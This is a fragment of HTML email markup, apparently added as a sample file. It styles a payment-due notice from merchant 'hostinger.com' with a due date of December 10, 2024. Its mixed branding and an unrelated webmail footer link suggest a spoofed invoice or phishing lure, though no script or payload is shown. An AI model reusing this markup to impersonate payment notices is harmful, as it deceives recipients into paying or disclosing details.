+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: =
+10px; PADDING-RIGHT: 10px">
+<TABLE style=3D'BOX-SIZING: border-box; =
+FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica=
+ Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI =
+Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; =
+LINE-HEIGHT: normal; font-feature-settings: "liga" 0' cellSpacing=3D0 =
+cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">
+<TD class=3Dv1xmprfx_xmprfx_ppsans style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; PADDING-BOTTOM: 20px; PADDING-TOP: 0px; =
+OUTLINE-STYLE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<P class=3Dv1xmprfx_xmprfx_ppsans style=3D'BOX-SIZING: border-box; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; MARGIN: 0px 0px 1em' dir=3Dltr><FONT style=3D"BOX-SIZING: =
+border-box" size=3D2><FONT style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none"><STRONG style=3D"BOX-SIZING: border-box; =
+FONT-WEIGHT: bolder; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">Last date =
+to pay</STRONG></FONT><BR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none"><FONT style=3D"BOX-SIZING: border-box; =
+OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">dec 10, =
+2024</FONT></FONT></P></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: =
+none">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; WIDTH: 240px; =
+VERTICAL-ALIGN: top; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; PADDING-RIGHT: =
+10px">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; =
+OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none">
+<TD class=3Dv1xmprfx_xmprfx_ppsans =
+style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; PADDING-BOTTOM: =
+20px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; =
+PADDING-RIGHT: 0px">
+<P class=3Dv1xmprfx_xmprfx_ppsans style=3D'BOX-SIZING:=
+ border-box; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica =
+Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"=
+, "Segoe UI Symbol"; MARGIN: 0px 0px 1em' dir=3Dltr><FONT =
+style=3D"BOX-SIZING: border-box" size=3D2><FONT style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none" =
+color=3D#001435><STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: =
+bolder; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none">Merchant</STRONG></FONT=
+><BR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE:=
+ none"><FONT style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; =
+OUTLINE-STYLE: none" color=3D#001435><FONT style=3D"BOX-SIZING: border-box"=
+ color=3D#202122>hostinger.com</FONT></FONT></FONT></P></TD></TR></TBODY></=
+TABLE></TD>
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px; WIDTH: =
+240px; VERTICAL-ALIGN: top; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; =
+PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 10px; PADDING-RIGHT: =
+10px">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; =
+OUTLINE-STYLE: none">
+<TR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none">
+<TD class=3Dv1xmprfx_xmprfx_ppsans =
+style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: medium; PADDING-BOTTOM: =
+20px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; =
+PADDING-RIGHT: 0px">
+<P class=3Dv1xmprfx_xmprfx_ppsans style=3D'BOX-SIZING:=
+ border-box; FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica =
+Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji"=
+, "Segoe UI Symbol"; MARGIN: 0px 0px 1em' dir=3Dltr><FONT =
+style=3D"BOX-SIZING: border-box" size=3D2><FONT style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none"><STRONG =
+style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none">Email</STRONG></FONT><BR style=3D"BOX-SIZING: =
+border-box; OUTLINE-WIDTH: medium; OUTLINE-STYLE: none"><FONT =
+style=3D"BOX-SIZING: border-box; COLOR: blue; OUTLINE-WIDTH: medium; =
+OUTLINE-STYLE: none"><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: =
+none; COLOR: rgb(0,172,255); BACKGROUND-COLOR: transparent" =
+rel=3Dnoreferrer>info@hostinger.com</A></FONT></FONT></P></TD></TR></TBODY>=
+</TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; OUTLINE-WIDTH: =
+medium; OUTLINE-STYLE: none">
+<TD style=3D"BOX-SIZING: border-box; =
+BORDER-TOP: 0px; WIDTH: 240px; VERTICAL-ALIGN: top; OUTLINE-WIDTH: medium; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: =
+10px; PADDING-RIGHT: 10px"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TA=
+BLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY><=
+/TABLE></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></DI=
+V></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING:=
+ border-box; FONT-SIZE: 0px; MARGIN: 0px" vAlign=3Dtop align=3Dcenter>
+<DIV style=3D"BOX-SIZING: border-box; MAX-WIDTH: 100%; WIDTH: 600px; =
+VERTICAL-ALIGN: top; DISPLAY: inline-block; BACKGROUND-COLOR: white">
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; MAX-WIDTH: 600px; =
+FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe =
+UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI =
+Symbol"; BORDER-COLLAPSE: collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+HEIGHT: 1px; PADDING-TOP: 3px; MARGIN: 0px; BACKGROUND-COLOR: rgb(236,239,=
+244)"></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></TD></TR><=
+/TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE style=3D'BOX-SIZING: =
+border-box; FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", =
+"Segoe UI Emoji", "Segoe UI Symbol"; WHITE-SPACE: normal; WORD-SPACING: =
+0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
+COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; =
+WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: normal; BACKGROUND-COLOR: =
+rgb(255,255,255); font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial; text-decoration-color: initial; =
+font-feature-settings: "liga" 0' cellSpacing=3D0 cellPadding=3D0 =
+align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; =
+PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 10px; MARGIN: 0px; =
+PADDING-RIGHT: 10px" vAlign=3Dtop align=3Dleft>
+<TABLE style=3D'BOX-SIZING:=
+ border-box; FONT-SIZE: 13px; FONT-FAMILY: -apple-system, =
+BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple=
+ Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; BORDER-COLLAPSE: =
+collapse; FONT-WEIGHT: 400; LINE-HEIGHT: normal; font-feature-settings: =
+"liga" 0' cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: =
+border-box">
+<TD style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center; =
+MARGIN: 0px" colSpan=3D2 align=3Dcenter>
+<DIV style=3D"BORDER-LEFT-WIDTH: =
+0px; BOX-SIZING: border-box; FONT-SIZE: 10px; BORDER-RIGHT-WIDTH: 0px; =
+BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(51,51,51); PADDING-BOTTOM: 10px; =
+BORDER-TOP-WIDTH: 0px"><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION:=
+ none; COLOR: rgb(51,51,51); BACKGROUND-COLOR: transparent" =
+href=3D"https://email.ionos.de/appsuite/#" rel=3Dnoreferrer =
+target=3D_blank>=C2=A9 2024 hostinger 500 Terry A Francois Blvd San =
+Francisco, CA&nbsp;94158</A><BR style=3D"BOX-SIZING: border-box"><BR =
+style=3D"BOX-SIZING: border-box"></DIV></TD></TR></TBODY></TABLE></TD></TR>=
+</TBODY></TABLE></BODY></HTML>
